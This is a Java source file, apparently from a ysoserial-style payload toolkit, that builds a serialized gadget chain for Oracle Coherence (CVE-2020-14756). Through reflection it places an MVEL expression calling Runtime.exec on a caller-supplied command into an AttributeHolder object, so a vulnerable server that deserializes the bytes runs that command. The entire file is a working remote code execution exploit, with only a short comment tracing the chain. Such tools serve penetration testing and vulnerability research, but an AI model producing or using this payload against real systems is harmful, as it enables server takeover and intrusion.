package payloads;

// coherence-rest.jar
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
// coherence-web.jar
import com.tangosol.coherence.servlet.AttributeHolder;
// coherence.jar
import com.tangosol.util.SortedBag;
import com.tangosol.util.aggregator.TopNAggregator;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import util.PayloadRunner;


// CVE-2020-14756

/*
 * gadget:
 *  AttributeHolder.readExternal()
        ExternalizableHelper.readObject()
            ExternalizableHelper.readObjectInternal()
                ExternalizableHelper.readExternalizableLite()
                    PartialResult.readExternal()
                        PartialResult.add()
                            SortedBag.add()
                                ...
                                    AbstractExtractor.compare()
                                        MvelExtractor.extract()
 */

@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0"})
@Authors({ Authors.CCKUAILONG })
public class Coherence4 extends PayloadRunner implements ObjectPayload<AttributeHolder> {

	public AttributeHolder getObject(final String command) throws Exception {
		MvelExtractor extractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+command+"\")");
		MvelExtractor extractor2 = new MvelExtractor("");

		SortedBag sortedBag = new TopNAggregator.PartialResult(extractor2, 2);
		AttributeHolder attributeHolder = new AttributeHolder();
		sortedBag.add(1);

		Field m_comparator = sortedBag.getClass().getSuperclass().getDeclaredField("m_comparator");
		m_comparator.setAccessible(true);
		m_comparator.set(sortedBag, extractor);

		Method setInternalValue = attributeHolder.getClass().getDeclaredMethod("setInternalValue", Object.class);
		setInternalValue.setAccessible(true);
		setInternalValue.invoke(attributeHolder, sortedBag);

		return attributeHolder;
	}

	public static byte[] getBytes(final String command, Boolean fusion) throws Exception {
		return PayloadRunner.run(Coherence4.class, command, fusion);
	}
}
